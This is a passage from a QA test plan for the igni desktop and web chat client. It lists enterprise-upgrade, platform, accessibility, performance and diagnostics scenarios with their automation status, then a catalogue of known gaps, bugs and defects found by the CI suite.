| ENT-029 | 1.0.3 installed with `~/.ember`, a managed runtime in `<cache>/ember-code`, MCP servers and credentials | Install 1.0.4 over it (dmg replace / MSI over MSI / deb upgrade); launch | Data migrates (SESS-013); the legacy runtime cache is reused if `igni` is absent (`managed.rs:55-64`) and upgraded to igni-core 1.0.4; MCP servers and sign-in survive | Desktop | WD J2, J3; MAN on M | Planned |
| ENT-030 | 1.0.3 MDM files at `/Library/Application Support/Ember/managed-settings.yaml`, `/etc/ember/managed-settings.yaml`, `…/EmberCode/managed-settings.json` | Upgrade to 1.0.4 | The policy still applies, or the upgrade warns. **Gap:** 1.0.4 reads only the `igni` paths; the old files are silently ignored, so policy is lost on upgrade | M, L | MAN | Planned |
| ENT-031 | 1.0.3 user with `runtime_python` in `~/.ember/config.yaml` | First 1.0.4 launch | The provisioned runtime is used. **Gap:** the shell reads only `~/.igni/config.yaml` (`desktop_settings.rs:110-141`) before the backend's migration has run, so the first launch tries a managed install | Desktop | WD J2 | Planned |
| ENT-032 | Desktop app running with its spawned backend | Quit; then uninstall | No `igni_core.backend` process remains. Unix: SIGTERM, 3 s, SIGKILL; the parent-PID watchdog stops a backend whose shell died | L, M | WD J2; J4 | Covered: src-tauri/tests/spawn_smoke.rs; J2 (quit → no backend), J4 (quit and SIGKILL → backend gone) |
| ENT-033 | Windows, app running | Quit, then `msiexec /x /qn`; also uninstall while the app is running | No backend left; the lockfile is cleaned up. **Gap:** `terminate()` returns false on Windows, so the backend is force-killed (`process.rs:190-193`), which can leave a stale `.igni/backend.lock` | W | WD J3 | Covered: J3 (closing the window stops the backend; `msiexec /x /qn` leaves no app and no backend) |
| ENT-034 | After uninstall on each OS | Inspect `~/.igni`, `<cache>/igni` (`~/Library/Caches/igni`, `$XDG_CACHE_HOME/igni`, `%LOCALAPPDATA%\igni`), project `.igni/` | Documented: what stays and how to remove it. **Gap:** no cleanup and no documentation | Desktop | WD J2, J3; MAN | Planned |
| ENT-035 | A backend started by igni-core's CLI in the project (`.igni/backend.lock`) | Launch the app on that project; File › Restart Backend; quit | The app attaches; Restart is refused with a dialog (`RestartNotOwned`); quitting leaves that backend running; a lock with another wire version is refused | Desktop | VT (Rust); WD J2 | Covered: src-tauri/src/backend/supervisor.rs, src-tauri/src/discovery.rs (logic) |
| ENT-036 | All network capture on (lab) | Launch, sign in, chat for 10 min | Traffic only to the model provider or igni server, `api_url` / `portal_url` and the update endpoint (SECURITY.md: "igni sends nothing to Ignite Ember") | Desktop | MAN | Planned |
| ENT-037 | Model host on HTTPS with a certificate from a corporate CA; `SSL_CERT_FILE` names the CA | Run a turn | The backend trusts the CA and the turn is answered | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1) |
| ENT-038 | As ENT-037 without `SSL_CERT_FILE` | Run a turn | The turn fails with a visible error and the composer is usable; no silent hang | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1) |

### 8.9 Platforms (PLAT)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| PLAT-001 | macOS 26 Apple Silicon, clean user | Open the `.app` from the dmg | The loading page shows `igni-bootstrap-progress` steps (uv 0.5.7, Python 3.12, `igni-core[decisions]==1.0.4`, model prefetch), then the chat; the 1 GB free-space check passes | M, L, W | J2, J3 | Fixed in this branch: the loading page's seven stages match the shell's messages again (`clients/web/src/loadingStages.test.ts`), and J2/J3's first launch installs from the job's index and opens the chat. The 1 GB free-space check (PERF-011) stays open |
| PLAT-002 | Built `.app` | `codesign --verify --deep --strict igni.app`; `spctl -a -vv igni.app`; `xcrun stapler validate` | Valid Developer ID signature, notarised and stapled in release builds (ad-hoc until secrets are set, per `clients/tauri/README.md`) | M | J4 | Covered: J4 (`codesign --verify --deep --strict`, ad-hoc in CI; notarisation stays a release check) |
| PLAT-003 | Built `.app` | `plutil -p igni.app/Contents/Info.plist` | `CFBundleURLTypes` has scheme `igni`; `LSMinimumSystemVersion` 26.0; identifier `sh.ignite-ember.desktop` | M | J4 | Covered: J4 (`CFBundleURLSchemes` igni, identifier, `LSMinimumSystemVersion` 26.0) |
| PLAT-004 | Built `.app` | `codesign -d --entitlements - igni.app` | Exactly the entitlements in `entitlements.plist` (allow-jit, allow-unsigned-executable-memory, disable-library-validation, allow-dyld-environment-variables); review each for necessity | M | J4 | Covered: J4 (signed entitlements equal `entitlements.plist`) |
| PLAT-005 | macOS | Use the menus: igni › About, Check for Updates…, Services, Hide, Quit; File › New Chat (Cmd+N), New Window… (Cmd+Shift+N), Restart / Reinstall / Diagnose Backend, Close Window; native fullscreen | Every item acts on the window it was used in; Escape in fullscreen does not exit it (`block_fullscreen_exit`); the traffic lights stay in place | M | MAN; J4 partial | Planned (layout covered in src-tauri/src/menu.rs; fullscreen Escape in src/chat/escHandler.test.ts) |
| PLAT-006 | macOS 15 | Open the app | Refused by the OS with a minimum-version message | M | MAN | Planned |
| PLAT-007 | Intel Mac or Windows on ARM | First launch | A clear "unsupported platform" message (`uv.rs:53-60`), not a hang | M, W | MAN | Planned |
| PLAT-008 | Windows 11 with WebView2 | Silent MSI install; launch | No console window (`windows_subsystem="windows"`); the backend spawns; the chat works; the menu has "Quit igni" (Ctrl+Q) and "Toggle Full Screen" (F11) | W | WD J3 | Covered: J3 (silent MSI install; the installed app starts its backend and stops it on close; first launch installs the runtime from the job's index and a chat, an approval, the CSP check and an extension page pass through msedgedriver; the step then fails at the `igni://` link, F15) |
| PLAT-009 | Windows, the app was killed, leaving `.igni/backend.lock` behind | Relaunch | The stale lock is detected via the 500 ms port probe and a new backend spawns. Note `pid_alive` is always true on Windows (`discovery.rs:137-143`) | W | WD J3 | Planned |
| PLAT-010 | Windows user profile `C:\Users\Zoë Doe\` and a project in a path with spaces | Launch | The managed runtime in `%LOCALAPPDATA%\igni` and the project path work | W | WD J3 | Planned |
| PLAT-011 | Windows | `start "" "igni://open?open=plugins"` | Registered by `register_all()` at runtime; the app opens the page | W | WD J3 | Open; J3 (Windows) follows the link with `cmd /c start "" igni://open?open=plugins` and the Plugins page never appears — the check times out after 60 s (F15). The handler is registered; what fails is the link reaching the running app |
| PLAT-012 | Ubuntu 22.04 (.deb) under Xvfb + dbus | Install, launch, run a scripted turn, quit | Works on WebKitGTK; no leftover backend | L | WD J2 | Covered: J2 (Linux; the .deb installed with apt) in `desktop-e2e.yml` — first launch installs the runtime from the job's package index; chat, approval, extension page, igni:// link, quit. J3 (Windows; the MSI installed silently) gets as far as the same `igni://` link and fails there (F15) |
| PLAT-013 | AppImage on a system with its own `PYTHONHOME`/`LD_LIBRARY_PATH` | Launch | The backend starts with the user's environment; `$APPDIR` entries are stripped (`host_env.rs:22-50`) | L | VT (Rust); WD J2 | Covered: src-tauri/src/runtime/host_env.rs (logic) |
| PLAT-014 | Linux desktop | `xdg-open 'igni://open?open=plugins'` | The `.desktop` handler is registered; the running app opens the page | L | WD J2 | Covered: J2 (the `.desktop` handler is registered — `xdg-mime query default x-scheme-handler/igni` — and a followed link brings the running app to the page). On a runner with no desktop environment `xdg-open` cannot run the handler ("Permission denied" at xdg-open:811), so the job runs the handler's Exec line as a desktop would |
| PLAT-015 | GNOME on Wayland and on X11; KDE | Launch, resize, fullscreen (F11), notifications | Works on both; notifications appear (`notification:default`) | L | MAN | Planned |
| PLAT-016 | Desktop, backend still starting | File › New Window… twice quickly | "igni is still starting…" before ready; only one folder picker at a time; new windows `w-2`, `w-3`, 1100×780 | Desktop | WD J2 | Planned (labels and picker guard covered in src-tauri/src/windows/label.rs, src-tauri/src/windows/pick.rs) |
| PLAT-017 | Desktop with two windows | Close the last window; on macOS reopen from the Dock | Defined behaviour per OS (quit on Windows/Linux, stay on macOS) and the backend's state matches | Desktop | WD J2, J3; MAN on M | Planned |
| PLAT-018 | Desktop | Launch with a positional folder; with `IGNI_PROJECT_DIR`; from inside a git repo; with neither | The folder rules in `launch_args.rs` apply (positional, env, nearest `.git`, `~/Documents`, home) | Desktop | VT (Rust) | Covered: src-tauri/src/launch_args.rs |
| PLAT-019 | Desktop | Launch with `--reinstall`; separately File › Reinstall Backend (Clean) | The cache is wiped and reinstalled with progress; for an attached backend it is refused with a dialog that says why | Desktop | WD J2 | Planned |
| PLAT-020 | Web client built (`npm run build`) and served from `dist/` behind HTTPS with `?ws=` to a backend | Chrome, Edge, Firefox, Safari | Chat, approvals, extension pages work in each browser (the Playwright config covers only chromium) | Web | PWR J1 (chromium); MAN others | Planned |

### 8.10 Accessibility (A11Y)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| A11Y-001 | Mocked backend | Run axe on the chat, a conversation, the slash menu, each panel page, Hooks, Watcher, Help, the notifications drawer, in light and dark | No violations | All | PWF | Covered: e2e/app-shell-accessibility.spec.ts |
| A11Y-002 | Demo screens | Run axe | No violations (both themes with `IGNI_E2E_A11Y_BOTH=1`) | All | PWF | Covered: e2e/app-accessibility.spec.ts |
| A11Y-003 | Mocked backend with sessions | Keyboard only: Tab from load to the composer, send, Escape, open the sidebar, open a past session | Every step reachable. **Gap:** session rows are clickable `div`s with no role or tabIndex (`Sidebar.tsx:187`) | All | PWF | Planned |
| A11Y-004 | Model picker open | Arrow keys and Enter to pick a model | Works. **Gap:** model items are `div`s with no role or tabIndex (`popups.tsx:76`) | All | PWF | Planned |
| A11Y-005 | Tool card in transcript | Expand it with the keyboard | Works. **Gap:** the header is a clickable `div` (`ToolCardView.tsx:46`) | All | PWF | Planned |
| A11Y-006 | Approval pending | Keyboard only | Focus moves into `HitlDialog`; all four buttons reachable in order; Escape rejects all | All | PWF | Planned |
| A11Y-007 | Any | Query every icon-only button by role and name (Stop, Send, "Scroll to latest", "Copy code", "Expand code", account chip, theme toggle) | Each has an accessible name | All | PWF | Planned |
| A11Y-008 | VoiceOver (M), NVDA (W), Orca (L) | Send a message and listen | "igni is replying…" is announced (`aria-live=polite`); the finished reply is announced or reachable. **Gap:** streamed text itself is not announced | Desktop | MAN | Planned |
| A11Y-009 | Account menu open | Escape | The menu closes and focus returns to the chip | All | PWF | Covered: e2e/app-shell-accessibility.spec.ts |
| A11Y-010 | Drawer or `LoginPanel` open | Tab past the last control | Focus stays inside; the element has `role=dialog`. **Gap:** neither has a role or focus trap | All | PWF | Planned |
| A11Y-011 | Interrupted session open | Scroll the transcript up and down past the banner | Focus is not stolen. **Bug:** `InterruptedBanner` focuses on every mount (`InterruptedBanner.tsx:36`) and Virtuoso remounts it | All | PWF | Planned |
| A11Y-012 | Group branding with accent `#ffff00` | Run axe colour-contrast on chat and buttons | Contrast still passes, or the brand colour is adjusted. **Gap:** theme validation checks only hex syntax (`lib/theme.ts`) | All | PWF | Planned |
| A11Y-013 | Sidebar open | Run axe landmark rules; inspect the landmarks | No `<nav>` nested in `<nav>` (present today in `Sidebar.tsx`) | All | PWF | Planned |
| A11Y-014 | 200% zoom, 320 px wide window, Windows High Contrast (forced colours), `prefers-reduced-motion` | Use chat and approvals | Usable without horizontal scroll; controls visible in forced colours; motion reduced | All | MAN | Planned |
| A11Y-015 | Extension page; interrupted banner | Inspect the frame; press Enter / Backspace / e on the banner | The frame is named after the page; banner shortcuts act | All | VT | Covered: src/extensions/ExtensionPage.test.tsx, src/components/InterruptedBanner.test.tsx |

### 8.11 Performance and resilience (PERF)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| PERF-001 | Real backend, scripted model | Run 500 turns with tool calls in one session; sample `performance.memory` / CDP heap after GC every 50 turns | Heap growth levels off (proposed budget: < 150 MB growth after turn 100); no detached-node growth | Web | PWR J1 (nightly) | Planned |
| PERF-002 | Desktop | 4-hour soak with a turn every 30 s | RSS of webview and backend stable; no handle leak (Windows) | Desktop | MAN; WD J2 nightly | Planned |
| PERF-003 | Desktop, managed runtime already installed | Measure from launch to composer enabled, cold and warm | Within the agreed budget (proposed: warm < 5 s, cold < 15 s); recorded per OS | Desktop | WD J2, J3; J4 | Planned |
| PERF-004 | Clean machine | Kill the app during `uv pip install`; relaunch | The marker is rewritten per step and only the missing steps rerun (`install_plan.rs`) | Desktop | MAN | Planned (per-component decisions covered in src-tauri/src/runtime/install_plan.rs) |
| PERF-005 | Real backend, script streams 5,000 deltas at 1 ms | Send; toggle the FPS overlay (Ctrl/Cmd+Alt+Shift+F) | No dropped or reordered text; the final text equals the script; frame rate stays usable | All | PWR J1 | Planned |
| PERF-006 | Desktop idle with one window | Measure CPU over 10 min (`get_status` poll every 5 s, `get_group_policy` every 60 s, `igni_is_fullscreen` every 300 ms on every OS, `init_script.js:176`) | Idle CPU under the agreed budget; the fullscreen poll should not run off macOS (finding) | Desktop | MAN | Planned |
| PERF-007 | Backend down for 10 min | Watch the reconnect loop | Retries capped at 5 s; no growth in memory or timers | All | VT; PWR J1 (long) | Covered: src/protocol/client.reconnect.test.ts (cap and reset) |
| PERF-008 | `IGNI_DEV_BACKEND` (with `IGNITE_EMBER_DEV=1`) pointing at a script that never prints the ready line | Launch | A timeout with a useful message. **Gap:** no timeout while waiting for `{"status":"ready","ws_port":N}`; bootstrap blocks forever (`process.rs:99-120`) | Desktop | WD J2 | Planned |
| PERF-009 | Desktop | Open five windows on five folders, each with a run | All stay responsive; one backend serves them; memory recorded | Desktop | WD J2 | Planned |
| PERF-010 | Composer | Paste or drop a 6 MB file | Refused (over 5 MB) with no RPC sent | All | VT | Covered: src/components/composer/Composer.mounted.test.tsx, src/protocol/backendCalls.test.ts |
| PERF-011 | Clean machine with 1.5 GB free | First launch | The free-space check stops before the ~1.7 GB model download. **Gap:** the check is 1 GB (`managed.rs:30`) | Desktop | MAN | Planned |

### 8.12 Diagnostics (DIAG)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| DIAG-001 | Desktop | File › Diagnose Backend | A dialog with app version, actual igni-core version, source (dev override / provisioned / managed venv / attached), interpreter, venv path, `IGNI_RUNTIME_PYTHON`, `runtime_python`, the dev env vars, marker path and contents; a version mismatch flagged | Desktop | VT (Rust); WD J2 | Covered: src-tauri/src/diagnostics.rs (report content; UI leg Planned) |
| DIAG-002 | Diagnose dialog open | Try to copy or export the report | A copy or export action. **Gap:** a native Info dialog only; labels still say "ignite-ember" (`diagnostics.rs:176-177`) | Desktop | MAN | Planned |
| DIAG-003 | Web client | Look for a diagnostics or settings view | **Not implemented — gap:** no Settings view and no Diagnostics view. Only `BackendVersionChip` (expected vs actual CLI, tones ok / warn / danger) | All | VT | Covered: src/components/BackendVersionChip.test.tsx (the chip only) |
| DIAG-004 | Real backend | Run a turn; set `IGNI_DEBUG_LOG=1` | `~/.igni/logs/backend.log` is written; debug logging adds detail; tokens and credentials do not appear in the log | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1; the log is written and holds neither the window token nor the access token) |
| DIAG-005 | Desktop | Look for the shell's own logs | A log file per OS with rotation. **Gap:** the shell only uses `eprintln!`; a Windows release build has no console (`main.rs:1`), so its messages are lost | Desktop | MAN | Planned |
| DIAG-006 | Shell panic, webview crash, backend crash | Trigger each (debug build) | A crash report or at least a log entry and a user-facing message. **Not implemented — gap:** no crash reporter anywhere | Desktop | MAN | Planned |
| DIAG-007 | `IGNI_DEV_BACKEND` pointing at an interpreter that exits with an error | Launch | "Bootstrap failed: …" as text (not markup) with the stderr tail (40 lines); `igni-bootstrap-error` emitted | Desktop | VT (Rust); WD J2 | Covered: src-tauri/src/bootstrap.rs ("the_message_is_text_not_markup"; UI leg Planned) |
| DIAG-008 | Real backend | Run `/bug` | The backend's bug-report flow answers in chat with what it collected and where | All | PWR J1 | Planned |
| DIAG-009 | Mocked backend | Force a render exception in a chat item and an `unhandledrejection` | An error boundary shows a recoverable message. **Gap:** no root error boundary and no `unhandledrejection` hook (`main.tsx:54`); only visualisations and json-render are guarded | All | PWF | Planned |
| DIAG-010 | Real backend with background processes and seeded orphans | Open the Watcher panel; restart the backend | Live processes listed; the footer pill shows; orphans surface after restart with their per-pid log tail | All | PWR | Covered: e2e/watcher-demo.spec.ts, e2e/watcher-footer-pill.spec.ts, e2e/watcher-orphan-live.spec.ts, e2e/watcher-orphan-with-logs.spec.ts (green again in J1) |
| DIAG-011 | Real backend | Open the header tools menu | Exactly 13 entries, each opening its feature | All | PWR | Covered: e2e/live-affordances.spec.ts (green again in J1) |
| DIAG-012 | Desktop, two windows on two folders | File › Restart Backend | "Restarting the backend…"; graceful shutdown (3 s); every window comes back on its own folder and the new port | Desktop | VT (Rust); WD J2 | Covered: src-tauri/src/bootstrap.rs ("a_window_comes_back_on_its_own_folder_and_the_new_port"; UI leg Planned) |

## 9. Gaps and bugs found while writing this plan

Paths are relative to `clients/web/src/`, `clients/tauri/src-tauri/` or igni-core as marked. Each item links to its scenario.

**Web client**

1. ~~Stop during a pending approval neither rejects nor closes the dialog.~~ Corrected by J1: against a real backend no Stop button is shown while an approval waits (the stream has ended, the phase is `finalizing`, the indicator says "Finalizing…"); Escape rejects and cancels. The gap is the missing visible Stop and the misleading label (CHAT-008).
2. A disconnect mid-run settles as `done`, not interrupted: `protocol/replyCorrelator.ts:95-106`, `chat/runStreamer.ts:115`. `run_error` never sets `errored`: `chat/serverMessageReducer.ts:126` (CHAT-020, CHAT-031).
3. `cancel` / `cancelLogin` throw when disconnected: `protocol/client.ts:250`. `LoginPanel` gets stuck: `components/panels/LoginPanel.tsx:53` (CHAT-010, AUTH-006).
4. `JSON.parse` with no guard in `ws.onmessage`: `protocol/client.ts:94` (CHAT-030).
5. Tool results are matched to "the last running tool", not by id: `chat/serverMessageReducer.ts:63,76` (CHAT-032).
6. `HitlDialog` cursor is not reset when the batch shrinks: `components/HitlDialog.tsx:61` (TOOL-011). Stale approvals survive `/clear`, `/fork` and session pick: `chat/sessionSwitcher.ts:53` (TOOL-013). ~~There is no way to fetch pending approvals after a reload.~~ Corrected by J1: the backend rebroadcasts `run_paused` and the dialog comes back (TOOL-009).
7. "Accept all edits during this session" lasts one run: `chat/useChatController.ts:73` (TOOL-008).
8. Finalizing: Stop is hidden but Escape cancels, and a message sent then is not queued: `components/composer/ComposerBar.tsx:63`, `chat/runPhase.ts:64` (CHAT-009).
9. Browser tabs share `ember-code:client-id` and displace each other: `clientState.ts:50` (CHAT-027).
10. Models:
    - "current" marks the registry default: `protocol/composerWire.ts:80`.
    - No empty state, and the chip is hidden: `components/composer/ComposerBar.tsx:58`.
    - A registry failure only warns: `components/composer/useComposerPopup.ts:58`.
    - (MODEL-005, MODEL-006, MODEL-007)
11. Chat markdown:
    - ~~No `a` renderer, so no target or rel.~~ **Fixed in this branch**: outward links open with `target=_blank rel="noopener noreferrer"` (`PlainMarkdown.tsx`, `ChatMarkdown.test.tsx`).
    - Remote images load.
    - ~~No test file.~~ `ChatMarkdown.test.tsx` now.
    - `components/markdown/PlainMarkdown.tsx`; the web build has no CSP (`clients/web/index.html`).
    - (SEC-001, SEC-002, SEC-004, SEC-006)
12. A top-level `?ws=` connects to any backend: `protocol/wsEndpoint.ts` (SEC-018).
13. No truncation of oversized assistant text or tool output (SEC-007, CHAT-018).
14. No pagination for `get_chat_history` (`chat/historyLoader.ts:35`) or `list_sessions` (SESS-008, SESS-009).
15. Wall sign-in failure is invisible: `chat/shellActions.ts:82`, `App.tsx:132` (AUTH-007). There is no login timeout (AUTH-008) and no "group policy required" screen (AUTH-014).
16. Extension frames have no load or handshake timeout and no error boundary; there is no root error boundary or `unhandledrejection` hook: `extensions/ExtensionFrame.tsx`, `main.tsx:54` (EXT-016, DIAG-009).
17. Keyboard and accessibility:
    - Clickable divs: `components/Sidebar.tsx:187`, `components/composer/popups.tsx:76`, `components/chatItems/ToolCardView.tsx:46`.
    - Nested `<nav>`.
    - `Drawer` and `LoginPanel` have no dialog role or focus trap.
    - `InterruptedBanner` steals focus: `components/chatItems/InterruptedBanner.tsx:36`.
    - (A11Y-003 to A11Y-005, A11Y-010, A11Y-011, A11Y-013)

**Desktop shell**

18. No watchdog after the ready line, and no timeout waiting for it: `src/backend/process.rs:99-120` (CHAT-021, PERF-008).
19. Windows specifics:
    - Backend force-killed on quit: `src/backend/process.rs:190-193`.
    - `pid_alive` always true: `src/discovery.rs:137-143`.
    - No logs in release builds: `src/main.rs:1`.
    - (ENT-033, PLAT-009, DIAG-005)
20. Runtime download integrity:
    - No hash or signature check on uv: `src/runtime/uv.rs:64-98`.
    - The install pins igni-core itself (`igni-core[decisions]==1.0.4`, `src/runtime/managed.rs:263-270`) but not its transitive dependencies: they are resolved from PyPI at install time, with no lockfile and no hashes.
    - Predictable temp paths: `uv.rs:86,105`.
    - (SEC-034)
21. Proxy and CA: the uv download likely ignores `HTTPS_PROXY` (`uv.rs:71-74`) and uses bundled webpki roots (`Cargo.toml:42`). There is no proxy setting anywhere (ENT-012 to ENT-014).
22. `runtime_python` is honoured from the user-writable `~/.igni/config.yaml`: `src/desktop_settings.rs:111` (SEC-035).
23. A JSON managed file with a non-integer `update_check_ttl` overrides lower layers: `src/desktop_settings.rs:81` (ENT-005).
24. No macOS profile or Windows registry policy: `src/desktop_settings.rs:155-166` (ENT-006). 1.0.3 managed-settings paths are silently dropped on upgrade (ENT-030). The shell reads no `~/.ember` fallback: `src/desktop_settings.rs:110-141` (ENT-031).
25. Unpinned group packs trust the user-writable JWKS: `src/group_pack/mod.rs:19-21` (ENT-011).
26. Opener scopes: `open_path` admits executables under `$HOME/**`, and `reveal_item_in_dir` is unscoped: `capabilities/default.json:13-18` (SEC-009, SEC-012).
27. CSP admits every loopback port for `connect-src` and `frame-src`: `tauri.conf.json:16` (SEC-025).
28. Deep links: the fragment is not counted against the length cap and is held whole: `src/deep_link.rs:61-65` (SEC-015).
29. The free-space check (1 GB) is smaller than the model (~1.7 GB): `src/runtime/managed.rs:30` (PERF-011).
30. The fullscreen poll runs every 300 ms on every OS: `src/init_script.js:176` (PERF-006).
31. Updates:
    - No channels (ENT-026).
    - The compiled endpoint uses the old repo name: `tauri.conf.json:22-23` (ENT-028).
    - `Cargo.toml:18-21` claims a startup update check that `run()` does not make.
32. There is no crash reporter, no shell log file, and the diagnostics dialog has no export (DIAG-002, DIAG-005, DIAG-006).

**Docs**

33. docs/releases/v1.0.4.md says nothing moves on upgrade, but `~/.ember` → `~/.igni`, the managed-settings paths and the runtime cache all move (SESS-013, ENT-030).
34. The published artefacts and the docs disagree: docs name only the dmg, msi and AppImage, but `bundle.targets: "all"` also builds NSIS, deb and rpm (ENT-022). The `igni-desktop-installer.dmg` example in docs/VERIFYING_RELEASES.md is not produced.
35. Stale text elsewhere:
    - SECURITY.md links `docs/SECURITY.md` and `docs/VULNERABILITY_MANAGEMENT.md`, which are not in this repo.
    - `clients/tauri/README.md` still requires "ignite-ember installed".
    - `clients/tauri/README.md` says `IGNI_PYTHON` works without `IGNITE_EMBER_DEV=1`.

**Test suite**

36. ~~The e2e backend runs with no `IGNI_WS_TOKEN`.~~ Fixed: that is why every live spec was red on main (section 6); the fixture now sets one (SEC-019).
37. `live-affordances.spec.ts` says "nine cards" in its title, but its `CARDS` array lists 7.

## 10. Found by the suite (J1–J4)

Product defects the automated scenarios found, and where each belongs. On this branch the Linux (J2) and macOS (J4) jobs are green and the Windows job (J3) is red in one step: the `igni://` link (F15).

| # | Finding | Where | Scenario | State |
|---|---|---|---|---|
| F1 | Every live spec on main sat at "Connecting to backend…": the fixture gave the backend no window token | igni-app test fixture | section 6 | Fixed in this branch |
| F2 | A link in a reply navigated the web client's own tab away, and the opened page kept `window.opener` | igni-app web (`PlainMarkdown.tsx`) | SEC-004 | Fixed in this branch; `ChatMarkdown.test.tsx` pins it |
| F3 | After a long reply the transcript stops following its tail; the next message and its answer land out of view (virtualised away) | igni-app web (`AppComposer.tsx`, `App.tsx`) | CHAT-018 | Fixed in this branch: sending scrolls to the end |
| F4 | A message queued behind a running turn is never run if that turn makes no tool call: the queue drains only into tool results (`core/hooks/queue/injector.py`), and nothing starts a turn for what is left when a run ends. The app promises "Queued — will run after the current turn" | **igni-core** | CHAT-012, CHAT-014 | Fixed upstream (igni-core cefccc4f): what is left in the queue when a run ends is the next turn (`backend/message_dispatcher.py`, `_run_queued`). Both rows run green; the `test.fail()` on CHAT-012 and the `test.fixme()` on CHAT-014 are gone with the bug |
| F5 | Two tabs of one browser share the client id: the second lands on the first's session, its socket is displaced and its messages get no answer | igni-app web (`clientState.ts`) with igni-core's per-client window model | CHAT-027 | Open; `test.fail()` — a design change (per-tab id) for the owner |
| F6 | No visible Stop while an approval waits; the indicator says "Finalizing…" | igni-app web (`runPhase.ts`, `ComposerBar.tsx`) | CHAT-008 | Open; no visible Stop while an approval waits (a UX decision for the owner) |
| F7 | The desktop app did not compile for Windows: zip 9 made `ZipFile::name()` fallible and the Windows-only uv extraction still called `.ends_with` on it. No CI job compiled the Windows target | igni-app desktop (`runtime/uv.rs`) | PLAT-008 | Fixed in this branch; the extraction is tested on every platform |
| F8 | "Reinstall Backend (Clean)" removed the whole managed-runtime directory, `%LOCALAPPDATA%\igni` on Windows — which is also where both the NSIS and the MSI installer put the app (J3 shows both installing to `C:\Users\<user>\AppData\Local\igni`). A clean reinstall deleted the installed app and its uninstaller | igni-app desktop (`runtime/managed.rs`) | PLAT-019, ENT-021 | Fixed in this branch: only the runtime's own files are removed, with a test. Sharing the folder at all is worth a look by the owner |
| F9 | The first-launch progress bar stopped at step 4 of 7 for the igni-core install and the 1.7 GB model download: its patterns still named the pre-rename package and model; the hint said "~250 MB" | igni-app web (`public/loading.html`) | PLAT-001, PLAT-012 | Fixed in this branch; `loadingStages.test.ts` ties the page to the shell's messages |
| F10 | igni-core requires `ripgrep~=15.1.0` on every x86_64 Linux, but PyPI's only Linux wheel is `manylinux_2_39` (glibc 2.39, Ubuntu 24.04+). On Ubuntu 22.04 / Debian 12 / RHEL 9 the desktop's first-launch install must compile it from source (needs Rust) or fail | **igni-core** (`pyproject.toml` marker) | PLAT-012, ENT-015 | Open; J2's mirror builds the wheel |
| F11 | `igni ext init` dies with `UnicodeEncodeError` on a Windows console (cp1252): it prints "→" | **igni-core** (CLI output) | EXT-022 on Windows | Open; the desktop runner sets `PYTHONUTF8=1` and `PYTHONIOENCODING=utf-8` for the scaffold |
| F12 | The Windows app could not be driven by WebDriver: wry always sets WebView2's `AdditionalBrowserArguments`, so the documented `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` (how msedgedriver, an administrator or support passes WebView2 a switch) was ignored and `--remote-debugging-port` never opened ("DevToolsActivePort file doesn't exist") | igni-app desktop (`windows/browser_args.rs`) | PLAT-008 | Fixed in this branch: wry's defaults plus the environment's switches, unit-tested. J3 attaches msedgedriver with `debuggerAddress` (msedgedriver also mangles launch arguments into `--<arg>`) |
| F13 | Tauri's updater accepts only `https` update endpoints, so a plain-HTTP internal mirror is refused (correctly, with an error that names it). Whether an HTTPS mirror signed by a corporate CA is trusted (the plugin's TLS roots) is untested | igni-app desktop (updater) | ENT-023, ENT-024 | Open; ENT-024 is covered by J2/J3 (a plain-HTTP mirror is refused), ENT-023 (an HTTPS mirror with a corporate CA) is planned |
| F14 | An instant bootstrap failure (air-gapped with no runtime) was emitted before WebView2 had loaded the loading view: the page sat on "Starting up…" forever with the reason lost (Windows) | igni-app desktop + web (`bootstrap.rs`, `public/loading.html`) | ENT-016 | Fixed in this branch: the shell keeps the state and the page asks for it on attach (`igni_bootstrap_state`), with tests |
| F15 | On Windows an `igni://` link does not reach the running app: the handler is registered (`HKCU\Software\Classes\igni\shell\open\command`) and the app is running, the link is opened, but the page never appears — the check times out after 60 s. The same check passes on Linux (J2) | igni-app desktop (Windows link handling) | EXT-007, PLAT-011, PLAT-014 | Open; J3 is red in this step |

